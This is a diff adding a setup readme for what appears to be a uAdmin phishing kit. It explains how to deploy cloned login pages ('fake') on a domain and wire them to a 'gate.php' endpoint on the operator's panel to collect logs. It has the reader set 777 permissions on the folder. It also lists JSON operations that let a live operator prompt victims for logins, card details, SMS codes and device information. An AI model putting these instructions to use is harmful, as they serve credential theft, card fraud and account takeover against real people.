@@ -1,0 +1,133 @@
+Key words;
+ zip           =  zip file you have been recived from me;
+ fake          =  cloned web pages
+ parent folder =  folder which contain all files, after unzip ;
+ cfg           =  file "config.json" located on 'parent folder';
+ uadmin link   =  link to uAdmin panel, for reciving logs from 'fake';
+ step          =  single step with html form and inputs/fields collection, used for request information from client;
+ 777           =  permissions form specific folder/files wich mean xrw-xrw-xrw for all posable users;
+ uadmin        =  Universal admin panel
+ token page.   =  Can be known as (Live page|Intercept page). It is type of the page which can be controlled over admin panel in real time.
+
+
+
+-After unzip 'zip' you will see 'parent folder'. Name for this folder can be changed to anything you like but it can not be removed and 'fake' MUST stay inside 'patent folder'.  After all in url you can only have unique folders name.
+   good!:
+      domen.com/parentfolder/..../login 
+      domen.com/anyname/..../login 
+      domen.com/sgi/..../login
+
+   not good!:
+      domen.com/name/name/..../login
+      domen.com/domen/..../login
+      domen.com/com/..../login
+      domen.com/dome/..../login
+
+
+-To connect 'fake' to 'uadmin' you have to edit 'home.php' file ,
+        OR download new 'home.php' file from already live uAdmin (no edit needed). 
+ If you choose to edit existing 'home.php' then open 'home.php' and find line with "http(s)://{domain|ip}/uadmin/gate.php" and change {domain|ip} to your domain name or ip, where uAdmin located.
+
+
+
+-Set '777' for 'parent folder' -R
+
+
+
+-To access page over browser you have to open 'parent folder' 
+    https://fakedomain.com/*/{parent_folder_name}/       where {parent_folder_name} is name of your 'parent folder' 
+
+-If page is 'token page' than after connect to 'uadmin' 
+       -go to token page on uadmin
+       -find connected page with green dot
+       -press O-Panel on its row
+       -press Operations settings
+       -press Advanced 
+       -empty pop up text box 
+       -insert json-formated commands in the bottom of this text file
+       -press "save" on pop up box
+       -press "save" on current page 
+       -go back to o-panel
+  after this you will be able to see commands set for current page       
+
+
+
+
+
+[
+  {
+    "button": "Ask Login",
+    "title": "Login",
+    "init_fn": "ask_login",
+    "id": "login",
+    "sql_ms": "Operation `Ask Login` added successfully",
+    "success_mes": "Login form displayed",
+    "desc": "Some extra information"
+  },
+  {
+    "button": "Ask Login Error",
+    "title": "Login Error",
+    "init_fn": "ask_valo3",
+    "id": "valo3",
+    "sql_ms": "Operation `Ask Login Error` added successfully",
+    "success_mes": "Login Error form displayed",
+    "desc": "Some extra information"
+  },
+  {
+    "button": "Ask Info",
+    "title": "Info",
+    "init_fn": "ask_cc",
+    "id": "cc",
+    "sql_ms": "Operation `Ask Info` added successfully",
+    "success_mes": "Info form displayed",
+    "desc": "Some extra information"
+  },
+  {
+    "button": "Ask APP",
+    "title": "APP",
+    "init_fn": "ask_info",
+    "id": "info",
+    "sql_ms": "Operation `Ask APP` added successfully",
+    "success_mes": "APP form displayed",
+    "desc": "Some extra information",
+    "inputs": [
+      "put here"
+    ]
+  },
+  {
+    "button": "Ask SMS",
+    "title": "SMS",
+    "init_fn": "ask_sms",
+    "id": "sms",
+    "sql_ms": "Operation `Ask SMS` added successfully",
+    "success_mes": "SMS form displayed",
+    "desc": "Some extra information"
+  },
+  {
+    "button": "Ask Readme",
+    "title": "Readme",
+    "init_fn": "ask_sim",
+    "id": "sim",
+    "sql_ms": "Operation `Ask Readme` added successfully",
+    "success_mes": "Readme form displayed",
+    "desc": "Some extra information"
+  },
+  {
+    "button": "Ask Appointment",
+    "title": "Appointment",
+    "init_fn": "ask_valo1",
+    "id": "valo1",
+    "sql_ms": "Operation `Ask Appointment` added successfully",
+    "success_mes": "Appointment form displayed",
+    "desc": "Some extra information"
+  },
+  {
+    "button": "Ask Device",
+    "title": "Device",
+    "init_fn": "ask_valo2",
+    "id": "valo2",
+    "sql_ms": "Operation `Ask Device` added successfully",
+    "success_mes": "Device form displayed",
+    "desc": "Some extra information"
+  }
+]
